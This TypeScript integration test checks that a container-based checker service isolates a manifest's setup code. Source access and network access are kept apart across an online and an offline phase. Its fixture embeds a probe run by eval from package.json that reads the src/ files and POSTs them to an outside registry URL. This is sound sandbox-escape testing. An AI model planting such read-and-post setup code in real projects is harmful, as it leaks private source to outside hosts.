import * as NodeChildProcess from "node:child_process";
import * as NodeFS from "node:fs";
import * as NodeOS from "node:os";
import * as NodePath from "node:path";

import * as NodeServices from "@effect/platform-node/NodeServices";
import { assert, it } from "@effect/vitest";
import * as Duration from "effect/Duration";
import * as Effect from "effect/Effect";
import * as Layer from "effect/Layer";
import * as Redacted from "effect/Redacted";

import { CommitSha, RelativePath, RepoId } from "@dorbs/protocol/typecheck";

import { makeRepo } from "../../../scripts/gitFixture.ts";
import { layer as dockerLayer } from "./Docker.ts";
import { Environments, layer as environmentsLayer } from "./Environments.ts";
import type { Recipe } from "./Recipe.ts";
import { ServiceConfig } from "./ServiceConfig.ts";
import { fetchTree, viewOf } from "./view.ts";

// A manifest's code, which a setup step runs: it reads src/, posts it to an allowed registry host
// and notes in the home what it read and what the post answered.
const PROBE = `
const fs = require("fs");
let source;
try {
  source = fs.readdirSync("src").map((file) => fs.readFileSync("src/" + file, "utf8")).join("");
} catch (error) {
  source = error.code;
}
fetch("https://registry.npmjs.org/-/dorbs-setup-escape-probe", {
  method: "POST",
  body: source,
  signal: AbortSignal.timeout(20000),
})
  .then((response) => "HTTP " + response.status, (error) => "failed: " + (error.cause?.code ?? error.message))
  .then((post) => fs.writeFileSync("/env/home/" + process.env.PHASE + ".json", JSON.stringify({ source, post })));
`;
const MARKER = "dorbs-setup-escape-marker";
const run = (phase: string) =>
  `PHASE=${phase} node -e "eval(require('./package.json').dorbsProbe)"`;

// Runs real containers through the egress proxy; set CHECKER_DOCKER=1 where rootless Docker and the
// dorbs-checker/node:1 image are, as on the checker's host.
it.live.skipIf(process.env["CHECKER_DOCKER"] !== "1")(
  "gives a manifest's setup code no source while it has the network, and no network once it has the source",
  () => {
    const root = NodeFS.mkdtempSync(NodePath.join(NodeOS.tmpdir(), "checker-escape-"));
    const gitDir = NodePath.join(root, "repo.git");
    const dataDir = NodePath.join(root, "data");
    NodeFS.mkdirSync(dataDir);
    const prefix = `dorbs-escape-${NodePath.basename(root).slice(-6).toLowerCase()}`;
    const files = {
      "package.json": JSON.stringify({ name: "escape", dorbsProbe: PROBE }),
      "src/secret.ts": `export const secret = "${MARKER}";\n`,
    };
    const commit = CommitSha.make(makeRepo(gitDir, files));
    const paths = Object.keys(files).map((path) => RelativePath.make(path));
    const keyFiles = [RelativePath.make("package.json")];
    const none = { files: [], deleted: [] };
    const recipe: Recipe = {
      image: "node",
      keyFiles,
      setup: [
        { id: "online", run: run("online"), cwd: ".", phase: "online" },
        { id: "offline", run: run("offline"), cwd: ".", phase: "offline" },
      ],
      checks: [],
      test: undefined,
      notes: [],
    };
    const config = ServiceConfig.of({
      dataDir,
      token: Redacted.make("t"),
      repos: new Map(),
      diskBudget: 1024 ** 3,
      idleAfter: Duration.minutes(10),
      retrySetupAfter: Duration.minutes(10),
      setupTimeout: Duration.minutes(2),
      checkTimeout: Duration.minutes(1),
      testTimeout: Duration.minutes(1),
      runSlots: 1,
      containerMemory: "1g",
      setupMemory: "1g",
      containerCpus: 1,
      containerPids: 256,
      setupEgress: "proxy",
      egressAllow: undefined,
      containerPrefix: prefix,
    });
    const services = environmentsLayer.pipe(
      Layer.provide(dockerLayer),
      Layer.provide(Layer.succeed(ServiceConfig, config)),
      Layer.provide(NodeServices.layer),
    );
    const removeContainers = Effect.sync(() => {
      const docker = (...args: Array<string>) =>
        NodeChildProcess.spawnSync("docker", args, { encoding: "utf8" });
      const names = docker("ps", "-aq", "--filter", `name=^${prefix}-`).stdout.split("\n");
      docker("rm", "-f", ...names.filter((name) => name !== ""));
      docker("network", "rm", `${prefix}-setup`);
      NodeFS.rmSync(root, { recursive: true, force: true });
    });
    return Effect.gen(function* () {
      const envs = yield* Environments;
      const used = yield* envs.use(
        {
          key: "escape",
          repo: RepoId.make("test/escape"),
          gitDir,
          recipe,
          image: "dorbs-checker/node:1",
          keyChange: none,
          fetch: fetchTree(paths, viewOf(paths, new Map(), none, undefined), keyFiles, none),
        },
        commit,
        none,
        () => Effect.void,
      );
      assert.strictEqual(used._tag, "Used");
      const seen = (phase: string): { source: string; post: string } =>
        JSON.parse(
          NodeFS.readFileSync(NodePath.join(dataDir, `envs/escape/home/${phase}.json`), "utf8"),
        );
      const online = seen("online");
      const offline = seen("offline");
      // Online the post goes out, with nothing of the source in it.
      assert.strictEqual(online.source, "ENOENT");
      assert.match(online.post, /^HTTP \d{3}$/);
      // Offline the code reads the source, and the post goes nowhere.
      assert.include(offline.source, MARKER);
      assert.match(offline.post, /^failed: /);
    }).pipe(Effect.provide(services), Effect.ensuring(removeContainers));
  },
  300_000,
);
